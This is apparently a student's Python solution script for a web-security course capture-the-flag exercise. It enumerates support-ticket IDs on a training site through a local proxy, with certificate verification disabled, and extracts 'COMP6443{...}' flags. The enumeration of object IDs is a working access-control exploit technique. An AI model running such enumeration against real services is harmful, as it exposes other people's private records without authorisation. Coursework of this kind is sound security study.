# support0_v2.py - F09A, wk 2

import requests, re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

s = requests.Session()
s.proxies = {"https": "127.0.0.1:8080"}
s.verify = False

flags = {}

for i in range(1, 358):
    response = s.get(f"https://support-v0.quoccacorp.com/raw/{i}/")
    print(response.text)

    # if "COMP6443{" in response.text:
    #   flags[i] = response.text

    flag = re.search(r"COMP6443{.+}", response.text)
    if flag:
        flags[i] = flag.group()

print(flags)
print()

for ticket_id, flag in flags.items():
    print(f"{ticket_id}: {flag}")

###

# response = s.get("https://support-v0.quoccacorp.com/raw/7/")
# print(response.text)
# response = s.get("https://support-v0.quoccacorp.com/raw/8/")
# print(response.text)
# response = s.get("https://support-v0.quoccacorp.com/raw/9/")
# print(response.text)

# response = requests.get(
#     "https://support-v0.quoccacorp.com/raw/7/",
#     proxies={"https": "127.0.0.1:8080"},
#     verify=False,
# )
